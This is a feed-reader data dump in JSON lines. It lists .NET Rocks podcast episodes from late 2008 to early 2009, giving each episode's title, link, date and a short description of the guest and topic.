{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=424","title":"Andrew Brust Talks BI","published":{"$wrap":"$date","v":1235707200000,"h":"2009-02-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Andrew is back to talk about the state of Business Intelligence technology.","author":false,"_id":{"$wrap":"$oid","v":468}}
{"k":"0000000082","o":"0000000422","v":"001"}
{"_id":469,"_uid":469,"_dt":1373728934086,"_s":"41ca66f966d581b5e652922617fe116c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=423","title":"Catching up with Pablo Castro","published":{"$wrap":"$date","v":1235534400000,"h":"2009-02-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Pablo Castro brings us up to date on ADO.NET Data Services, offline data, REST services, cloud computing, and more.","author":false,"_id":{"$wrap":"$oid","v":469}}
{"k":"0000000082","o":"0000000345","v":"001"}
{"_id":470,"_uid":470,"_dt":1373728934087,"_s":"c987a513bb2017200a50502996594699"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=422","title":"Doug Crockford","published":{"$wrap":"$date","v":1235016000000,"h":"2009-02-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Doug Crockford talks about Javascript, JSON and more!","author":false,"_id":{"$wrap":"$oid","v":470}}
{"k":"0000000082","o":"0000000446","v":"001"}
{"_id":471,"_uid":471,"_dt":1373728934087,"_s":"0e28bbf1709d9b3060b9855f39f33586"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=421","title":"Derik Whittaker on nHibernate","published":{"$wrap":"$date","v":1234843200000,"h":"2009-02-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Derik Whittaker about some of the supporting tools for nHibernate, such as FluentNHibernate, a DSL for nHibernate.","author":false,"_id":{"$wrap":"$oid","v":471}}
{"k":"0000000082","o":"0000000426","v":"001"}
{"_id":472,"_uid":472,"_dt":1373728934088,"_s":"57d13f1e02266768840ce0b1bbd40bbd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=420","title":"Alan Stevens on Community 2.0","published":{"$wrap":"$date","v":1234497600000,"h":"2009-02-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Alan Stevens about his involvement with the .NET community, and the wider developer community.","author":false,"_id":{"$wrap":"$oid","v":472}}
{"k":"0000000082","o":"0000000418","v":"001"}
{"_id":473,"_uid":473,"_dt":1373728934089,"_s":"add9576909e65c50a9aa6b6f1798f338"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=419","title":"Brian Noyes on the State of WPF and More","published":{"$wrap":"$date","v":1234238400000,"h":"2009-02-10T04:00:00.000Z"},"starred":false,"read":false,"content":"The always-thoughtful Brian Noyes shares his thoughts on the state of WPF, Silverlight, WF, and WCF.","author":false,"_id":{"$wrap":"$oid","v":473}}
{"k":"0000000082","o":"0000000464","v":"001"}
{"_id":474,"_uid":474,"_dt":1373728934089,"_s":"5ed44e4d601e7253c8cff76b326b9662"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=418","title":"Coding for Fun with Dan Fernandez and Brian Peek","published":{"$wrap":"$date","v":1233806400000,"h":"2009-02-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Dan and Brian talk about the fun projects they've created for their Coding for Fun book, the blog, the website, and all that goes with it.","author":false,"_id":{"$wrap":"$oid","v":474}}
{"k":"0000000082","o":"0000000431","v":"001"}
{"_id":475,"_uid":475,"_dt":1373728934090,"_s":"cc090283996f7695fb03069aecdb732d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=417","title":"Catching up with Rocky Lhotka","published":{"$wrap":"$date","v":1233633600000,"h":"2009-02-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Rocky about his new book as well as his thoughts on Oslo, DSLs, Windows Home Server, and Windows 7.","author":false,"_id":{"$wrap":"$oid","v":475}}
{"k":"0000000082","o":"0000000422","v":"001"}
{"_id":476,"_uid":476,"_dt":1373728934091,"_s":"6fd7431bf5d32c97acccc54218bb6644"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=416","title":"Bryan Wilhite Speaks!","published":{"$wrap":"$date","v":1233201600000,"h":"2009-01-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Bryan Wilhite talks about his open-source projects, and his experiences in the trenches as a .NET developer. Great stories!","author":false,"_id":{"$wrap":"$oid","v":476}}
{"k":"0000000082","o":"0000000485","v":"001"}
{"_id":477,"_uid":477,"_dt":1373728934092,"_s":"6cd69ca946e45654fe967ad984b805ce"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=415","title":"Aslam Khan talks Design","published":{"$wrap":"$date","v":1233028800000,"h":"2009-01-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Aslam Khan tells us his thoughts on good software design, focusing on the domain, resisting prototypes and big design up front. He also shares his thoughts about Software as a Service.","author":false,"_id":{"$wrap":"$oid","v":477}}
{"k":"0000000082","o":"0000000566","v":"001"}
{"_id":478,"_uid":478,"_dt":1373728934092,"_s":"d831ab7efb3c24bc713356c139973892"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=414","title":"Interviews from Codemash 2009","published":{"$wrap":"$date","v":1232596800000,"h":"2009-01-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard interview Joe Fiorini, Jonathan Penn, Josh Walsh, and Andrew Kavanaugh about winning the 2008 Rails Rumble contest; then Chris Marinos and Mike Woelmer about their Paint Wars XNA game; and finally Corey Haines about his Pair Programming Tour.","author":false,"_id":{"$wrap":"$oid","v":478}}
{"k":"0000000082","o":"0000000533","v":"001"}
{"_id":479,"_uid":479,"_dt":1373728934093,"_s":"425f103ff26e58c09c33f1d522415ae9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=413","title":"Mark Dunn Interviews at TechEd Europe 2008","published":{"$wrap":"$date","v":1232424000000,"h":"2009-01-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Mark Dunn joins Carl and Richard to review some of the interviews he did at TechEd EMEA in Barcelona, Spain in November, 2008. On board are Bob Beauchemin, John Flanders, Pat Helland, Richard Pawson, and Jay Roxe.","author":false,"_id":{"$wrap":"$oid","v":479}}
{"k":"0000000082","o":"0000000450","v":"001"}
{"_id":480,"_uid":480,"_dt":1373728934094,"_s":"35786a5356f13e35c2b091765b84850d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=412","title":"Live from CodeMash 2009!","published":{"$wrap":"$date","v":1231992000000,"h":"2009-01-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to an esteemed panel of experts about Rich Internet Applications, focusing on web-based apps at CodeMash 2009 in Sandusky, OH.","author":false,"_id":{"$wrap":"$oid","v":480}}
{"k":"0000000082","o":"0000000406","v":"001"}
{"_id":481,"_uid":481,"_dt":1373728934095,"_s":"44e24a2f6d8d7f4e7e5afabd58e3adbc"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=411","title":"Ward Bell on ORMs.","published":{"$wrap":"$date","v":1231819200000,"h":"2009-01-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Ward Bell offers his opinion of Object Relational Mappers, the Entity Framework, LINQ to SQL, and Silverlight.","author":false,"_id":{"$wrap":"$oid","v":481}}
{"k":"0000000082","o":"0000000427","v":"001"}
{"_id":482,"_uid":482,"_dt":1373728934095,"_s":"29d7fecb47439eba3c5ad1dfa9ca3cb3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=410","title":"Uncle Bob at Oredev","published":{"$wrap":"$date","v":1231387200000,"h":"2009-01-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard catch up with Bob Martin at Oredev in Malmo, Sweden. Topics range from debugging to software quality. Great show.","author":false,"_id":{"$wrap":"$oid","v":482}}
{"k":"0000000082","o":"0000000357","v":"001"}
{"_id":483,"_uid":483,"_dt":1373728934096,"_s":"4301328086d32fcd05f1597582925749"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=409","title":"Nick Hodges on Delphi.NET","published":{"$wrap":"$date","v":1231214400000,"h":"2009-01-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Nick Hodges about Delphi.NET.","author":false,"_id":{"$wrap":"$oid","v":483}}
{"k":"0000000082","o":"0000000408","v":"001"}
{"_id":484,"_uid":484,"_dt":1373728934097,"_s":"0bbc54be28d57a2b30a396feee1551e1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=408","title":"James Whittaker Takes Testing Seriously","published":{"$wrap":"$date","v":1230782400000,"h":"2009-01-01T04:00:00.000Z"},"starred":false,"read":false,"content":"James Whittaker brings a practical approach to testing, and his viewpoint may surprise you.","author":false,"_id":{"$wrap":"$oid","v":484}}
{"k":"0000000082","o":"0000000460","v":"001"}
{"_id":485,"_uid":485,"_dt":1373728934097,"_s":"66ac84ee5e1e4b52208ab3803060cd24"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=407","title":"Ted Neward at Oredev","published":{"$wrap":"$date","v":1230609600000,"h":"2008-12-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Ted Neward talk to Richard and Carl about Scala and other languages on stage at Oredev in Malmo, Sweden. Oren Eini was in the audience and got a good question in.","author":false,"_id":{"$wrap":"$oid","v":485}}
{"k":"0000000082","o":"0000000382","v":"001"}
{"_id":486,"_uid":486,"_dt":1373728934098,"_s":"db63fe9c0a1784384c795b9ad0449c4c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=406","title":"Catching up with Scott Bellware","published":{"$wrap":"$date","v":1230177600000,"h":"2008-12-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard sit down with Scott Bellware at Oredev in Malmo, Sweden.","author":false,"_id":{"$wrap":"$oid","v":486}}
{"k":"0000000082","o":"0000000489","v":"001"}
{"_id":487,"_uid":487,"_dt":1373728934099,"_s":"fb8ef73ecc9248725db937f2812cbced"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=405","title":"Cangialosi and Mariani on Visual Studio Extensibility (VSX)","published":{"$wrap":"$date","v":1230004800000,"h":"2008-12-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Anthony Cangialosi and Rico Mariani talk with Richard and Carl about Visual Studio Extensibility and the VS Ecosystem, and a little bit about IdeaBlade.","author":false,"_id":{"$wrap":"$oid","v":487}}
{"k":"0000000082","o":"0000000500","v":"001"}
{"_id":488,"_uid":488,"_dt":1373728934099,"_s":"6493f94a4a787724a60ad933a0135fbc"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=404","title":"The State of Silverlight witih Tim Heuer","published":{"$wrap":"$date","v":1229572800000,"h":"2008-12-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Tim Heuer from the Silverlight team at Microsoft talks to Carl and Richard about the current state of Silverlight, and offers his perspective on using Silverlight among other things.","author":false,"_id":{"$wrap":"$oid","v":488}}
{"k":"0000000082","o":"0000000455","v":"001"}
{"_id":489,"_uid":489,"_dt":1373728934100,"_s":"788ff6db946b3929dbb69c1d02e946f3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=403","title":"David Aiken on Azure","published":{"$wrap":"$date","v":1229400000000,"h":"2008-12-16T04:00:00.000Z"},"starred":false,"read":false,"content":"David Aiken is back, this time to lay down the skinny on Azure. What can you do with it? What doesn't it do? All this and more! Now how much would you pay???","author":false,"_id":{"$wrap":"$oid","v":489}}
{"k":"0000000082","o":"0000000487","v":"001"}
{"_id":490,"_uid":490,"_dt":1373728934101,"_s":"6c1469258bc23a2bd85025b959c92ac8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=402","title":"Catching up with Oren Eini","published":{"$wrap":"$date","v":1229054400000,"h":"2008-12-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Oren Eini spoke to Carl and Richard at 0redev in Malmo, Sweden in November about the latest version of Rhino Mocks, Oren's mocking framework. Oren also talks about mocking in General.","author":false,"_id":{"$wrap":"$oid","v":490}}
{"k":"0000000082","o":"0000000509","v":"001"}
{"_id":491,"_uid":491,"_dt":1373728934102,"_s":"1d0e80367877cc25e96d19624ee09bcc"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=401","title":"Oslo is Love with Chris Sells","published":{"$wrap":"$date","v":1228881600000,"h":"2008-12-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Chris Sells is here to explain Oslo for real. Don and Doug couldn't really dig deep into Oslo before the PDC, but now that it has been announced, Chris is here to splain it to everyone in clear English.","author":false,"_id":{"$wrap":"$oid","v":491}}
{"k":"0000000082","o":"0000000498","v":"001"}
{"_id":492,"_uid":492,"_dt":1373728934103,"_s":"6ad04f946e564a4ce70d32f0e76ae7a8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=400","title":"Show 400!","published":{"$wrap":"$date","v":1228449600000,"h":"2008-12-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard look back on the last year joined by a cast of former guests and conference speakers in the hotel bar at the Marriott Chateau Champlain in Montreal while at DevTeach. WARNING: Unbleeped F-Bombs!","author":false,"_id":{"$wrap":"$oid","v":492}}
{"k":"0000000082","o":"0000000686","v":"001"}
{"_id":493,"_uid":493,"_dt":1373728934103,"_s":"5e94a7259fea9c97c72630a47ac3e0ce"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=399","title":"The HP TouchSmart!","published":{"$wrap":"$date","v":1228190400000,"h":"2008-12-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Irwin Kwan, PM on TouchSmart team at Hewlett-Packard; Oluf Nissen, Dev on the TouchSmart team; Muffi Ghadiali, marketing for HP Touchsmart Software; and Matt Whitlock from Capable Networks, developer of www.touchsmartcommunity.com, a site dedicated to the TouchSmart community.  HP has just released a set of development guidelines for the TouchSmart. Check it out!","author":false,"_id":{"$wrap":"$oid","v":493}}
{"k":"0000000082","o":"0000000446","v":"001"}
{"_id":494,"_uid":494,"_dt":1373728934104,"_s":"b5f5306584a5f6ac97c624417107508a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=398","title":"Glenn Block on MEF","published":{"$wrap":"$date","v":1227758400000,"h":"2008-11-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Glenn Block talk to Carl and Richard about Microsoft MEF (Managed Extensibility Framework), which provides scalable extensibility for any application.","author":false,"_id":{"$wrap":"$oid","v":494}}
{"k":"0000000082","o":"0000000449","v":"001"}
{"_id":495,"_uid":495,"_dt":1373728934105,"_s":"a7835c808140bcbcb086cf5504030fa0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=397","title":"Michael Feathers talks Legacy Code","published":{"$wrap":"$date","v":1227585600000,"h":"2008-11-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Michael Feathers about how to bring legacy code (that which has no testing code coverage) into the 21st century.","author":false,"_id":{"$wrap":"$oid","v":495}}
{"k":"0000000082","o":"0000000481","v":"001"}
{"_id":496,"_uid":496,"_dt":1373728934106,"_s":"7c0f8170602dd4e5b4a3f26737290ff5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=396","title":"The Future of Web Development Panel","published":{"$wrap":"$date","v":1227153600000,"h":"2008-11-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Recorded live at Devreach in Sofia, Bulgaria, this is a discussion with Miguel Castro, Todd Anglin, Shawn Wildermuth, and Steven Smith. Mark Dunn filled in for Richard.","author":false,"_id":{"$wrap":"$oid","v":496}}
{"k":"0000000082","o":"0000000507","v":"001"}
{"_id":497,"_uid":497,"_dt":1373728934107,"_s":"40a8dae6984893b16ed1acc900ba59ee"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=395","title":"Mark Miller on UX Live at DevConnections Vegas","published":{"$wrap":"$date","v":1226980800000,"h":"2008-11-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Mark Miller has more to say about what makes for good User Interface and User Experience. Recorded live in front of an audience at DevConnections in Last Vegas, NV November 12th, 2008","author":false,"_id":{"$wrap":"$oid","v":497}}
{"k":"0000000082","o":"0000000459","v":"001"}
{"_id":498,"_uid":498,"_dt":1373728934108,"_s":"986700d82b62061b1505d5acfb5f9bd6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=394","title":"Costall and McMahon on Community in Britain","published":{"$wrap":"$date","v":1226548800000,"h":"2008-11-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Richard Costall and Dave McMahon join the boys for a discussion centering on their efforts to build community in Great Britain and beyond.","author":false,"_id":{"$wrap":"$oid","v":498}}
{"k":"0000000082","o":"0000000387","v":"001"}
{"_id":499,"_uid":499,"_dt":1373728934108,"_s":"8466cf5d44e2a111be4da648c84e5c32"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=393","title":"David Hayden on the Unity Framework","published":{"$wrap":"$date","v":1226376000000,"h":"2008-11-11T04:00:00.000Z"},"starred":false,"read":false,"content":"David Hayden talks to Carl and Richard about the Microsoft Unity Framework","author":false,"_id":{"$wrap":"$oid","v":499}}
{"k":"0000000082","o":"0000000436","v":"001"}
{"_id":500,"_uid":500,"_dt":1373728934109,"_s":"6235a8362b7f05b668db8b666a4bd54f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=392","title":"Ron Jacobs tells the REST of the story","published":{"$wrap":"$date","v":1225944000000,"h":"2008-11-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Ron Jacobs finally on .NET Rocks! Ron talks with Richard and Carl about architecture, REST, WCF, his podcasts, and more.","author":false,"_id":{"$wrap":"$oid","v":500}}
{"k":"0000000082","o":"0000000435","v":"001"}
{"_id":501,"_uid":501,"_dt":1373728934110,"_s":"0d0559702faa7211563c815ab482aa4a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=391","title":"Bill Wagner on Advanced C#","published":{"$wrap":"$date","v":1225771200000,"h":"2008-11-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Bill Wagner about the more advanced features of C# 3.0 and how they can be used to do some amazing things.","author":false,"_id":{"$wrap":"$oid","v":501}}
{"k":"0000000082","o":"0000000467","v":"001"}
{"_id":502,"_uid":502,"_dt":1373728934110,"_s":"44304f40f891f778f69f214346f068e5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=390","title":"YSlow! Steve Souders finds Website Bottlenecks","published":{"$wrap":"$date","v":1225339200000,"h":"2008-10-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Steven Souders, creator of YSlow, an analysis tool for finding website bottlenecks on the client side of the equation.","author":false,"_id":{"$wrap":"$oid","v":502}}
{"k":"0000000082","o":"0000000497","v":"001"}
{"_id":503,"_uid":503,"_dt":1373728934111,"_s":"b53eebc8e406a141e56588ef17fe1f98"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=389","title":"Surface!","published":{"$wrap":"$date","v":1225166400000,"h":"2008-10-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Robert Levy and Doug Kramer at the Microsoft Professional Developers Conference (PDC) in Los Angeles right after they unveiled the Microsoft Surface to the Microsoft developer community.","author":false,"_id":{"$wrap":"$oid","v":503}}
{"k":"0000000082","o":"0000000452","v":"001"}
{"_id":504,"_uid":504,"_dt":1373728934112,"_s":"09b88ed38033f7fe1f0e2b5a9ed6fb66"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=388","title":"Bob Martin (Uncle Bob) on Being a Professional!","published":{"$wrap":"$date","v":1224734400000,"h":"2008-10-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Bob Martin talks about how to achieve Clean Code, which also happens to be the name of his famous book on software development.","author":false,"_id":{"$wrap":"$oid","v":504}}
{"k":"0000000082","o":"0000000496","v":"001"}
{"_id":505,"_uid":505,"_dt":1373728934113,"_s":"8cdce983ae7623442145fb9bed6a8970"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=387","title":"Rocky Lhotka on CSLA.NET for Silverlight!","published":{"$wrap":"$date","v":1224561600000,"h":"2008-10-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Rocky is back to talk about his acclaimed CSLA.NET framework which was just released for Silverlight, allowing you to write CSLA clients in the browser... even running on a Mac!","author":false,"_id":{"$wrap":"$oid","v":505}}
{"k":"0000000082","o":"0000000514","v":"001"}
{"_id":506,"_uid":506,"_dt":1373728934113,"_s":"1ef4a051e56e14b38c6a622912d17181"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=386","title":"Interknowlogy Scratches the Surface!","published":{"$wrap":"$date","v":1224216000000,"h":"2008-10-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Dan Hanan and Kevin Kennedy from Interknowlogy talk about their experiences working with WPF, Surface, and Silverlight. Interknowlogy is run by Tim Huckaby, a long-time guest and friend of .NET Rocks!","author":false,"_id":{"$wrap":"$oid","v":506}}
{"k":"0000000082","o":"0000000503","v":"001"}
{"_id":507,"_uid":507,"_dt":1373728934114,"_s":"c2f2410999eb98fab8fa4dfd272578c3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=385","title":"Don Box and Doug Purdy on Oslo!","published":{"$wrap":"$date","v":1223956800000,"h":"2008-10-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Richard and Carl talk with Don Box and Doug Purdy about Microsoft code-name Oslo, a nascent set of developer tools and technologies that promise to make development much easier than it is today.","author":false,"_id":{"$wrap":"$oid","v":507}}
{"k":"0000000082","o":"0000000465","v":"001"}
{"_id":508,"_uid":508,"_dt":1373728934115,"_s":"aa373e30a0884864ff7bcee6ba9bcab8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=384","title":"Rob Tiffany on Windows Mobile","published":{"$wrap":"$date","v":1223524800000,"h":"2008-10-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Rob Tiffany stops by to talk about the lastest in Windows Mobile technology. Carl managed to squeeze a hint out of him about what's next for Windows Mobility.","author":false,"_id":{"$wrap":"$oid","v":508}}
{"k":"0000000082","o":"0000000409","v":"001"}
{"_id":509,"_uid":509,"_dt":1373728934116,"_s":"ebc4cf8346d355387f455b36c6fd6b7b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=383","title":"Jon Skeet on C# 3.0","published":{"$wrap":"$date","v":1223352000000,"h":"2008-10-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to author and developer Jon Skeet about his work with C# and Java at Google and elsewhere.","author":false,"_id":{"$wrap":"$oid","v":509}}
{"k":"0000000082","o":"0000000459","v":"001"}
{"_id":510,"_uid":510,"_dt":1373728934116,"_s":"a7664fa573eb930764740b49a4f5947c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=382","title":"Andrew Delin on SOX Compliance","published":{"$wrap":"$date","v":1222920000000,"h":"2008-10-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Andrew Delin about why developers should care about the Sarbanes Oxley Act and why a compliance plan is in your best interest.","author":false,"_id":{"$wrap":"$oid","v":510}}
{"k":"0000000082","o":"0000000461","v":"001"}
{"_id":511,"_uid":511,"_dt":1373728934117,"_s":"dc4639451df97dce1e1d13a8ad3bf84e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=381","title":"Catching up with Michele Leroux Bustamante","published":{"$wrap":"$date","v":1222747200000,"h":"2008-09-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Michele Leroux Bustamante talks to Carl and Richard for the first time since she had her first kid! The topic is federated identity services.","author":false,"_id":{"$wrap":"$oid","v":511}}
{"k":"0000000082","o":"0000000428","v":"001"}
{"_id":512,"_uid":512,"_dt":1373728934118,"_s":"58c13fedd280fc70571e1fd8b199d8f4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=380","title":"Frans Bouma on ORM!","published":{"$wrap":"$date","v":1222315200000,"h":"2008-09-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Frans Bouma about his thoughts on the ORM revolution, his products, and the Entity Framework. Great stuff!","author":false,"_id":{"$wrap":"$oid","v":512}}
{"k":"0000000082","o":"0000000503","v":"001"}
{"_id":513,"_uid":513,"_dt":1373728934118,"_s":"73d71573e8a74e8642d9208073c5b347"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=379","title":"Billy Hollis on WPF and Silverlight 2.0","published":{"$wrap":"$date","v":1222142400000,"h":"2008-09-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard catch up with Rev. Billy (just kidding, Billy) to talk about the state of WPF and Silverlight 2.0. Billy always has great stories from the field, and real-world insight.","author":false,"_id":{"$wrap":"$oid","v":513}}
{"k":"0000000082","o":"0000000407","v":"001"}
{"_id":514,"_uid":514,"_dt":1373728934119,"_s":"2011f7b9825b62d79596f985bc64bba2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=378","title":"Michael Isard on Dryad","published":{"$wrap":"$date","v":1221710400000,"h":"2008-09-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Richard and Carl talk to Michael Isard about Dryad, a grid computing and clustering project from Microsoft.","author":false,"_id":{"$wrap":"$oid","v":514}}
{"k":"0000000082","o":"0000000452","v":"001"}
{"_id":515,"_uid":515,"_dt":1373728934120,"_s":"0054f5fb246103cdc70b6dba28a1af3d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=377","title":"Ted Neward and Amanda Laucher on F#","published":{"$wrap":"$date","v":1221537600000,"h":"2008-09-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Ted Neward and Amanda Laucher about their work with F# and separate truth from fiction about functional languages.","author":false,"_id":{"$wrap":"$oid","v":515}}
{"k":"0000000082","o":"0000000639","v":"001"}
{"_id":516,"_uid":516,"_dt":1373728934121,"_s":"d4be1d3458a9075baa14d3f6470b9cad"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=376","title":"Catching up with Charles Petzold","published":{"$wrap":"$date","v":1221105600000,"h":"2008-09-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and guest co-host Mark Dunn talk with Charles Petzold about the life of the father of modern computing, Alan Turing. Charles talks about his book, \"The Annotated Turing: A Guided Tour through Alan Turing's Historic Paper on Computability and the Turing Machine.\", and also discusses writing books, blogs, and online media.","author":false,"_id":{"$wrap":"$oid","v":516}}
{"k":"0000000082","o":"0000000620","v":"001"}
{"_id":517,"_uid":517,"_dt":1373728934121,"_s":"10b981b9be9e20965776ec4dcd6b5c2d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=375","title":"Steve Teixeira on Parallelism","published":{"$wrap":"$date","v":1220932800000,"h":"2008-09-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Steve Teixeira, Product Unit Manager for the Parallel Development Tools team within Developer Division's Parallel Computing Platform organzation at Microsoft. The conversation is mostly around the future of parallel computing highlighting offerings that Microsoft is currently working on.","author":false,"_id":{"$wrap":"$oid","v":517}}
{"k":"0000000082","o":"0000000585","v":"001"}
{"_id":518,"_uid":518,"_dt":1373728934122,"_s":"3f6447e04e5e8750537d4f9ecafd49df"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=374","title":"Glenn Block and Brian Noyes on Prism","published":{"$wrap":"$date","v":1220500800000,"h":"2008-09-04T04:00:00.000Z"},"starred":false,"read":false,"content":"While at TechEd 2008 in Orlando Carl and Richard recorded this interview with Glenn Block from Microsoft and Brian Noyes from iDesign about the Prism project, formally named Composite Application Guidance, which promises to simplify and organize WPF development projects.","author":false,"_id":{"$wrap":"$oid","v":518}}
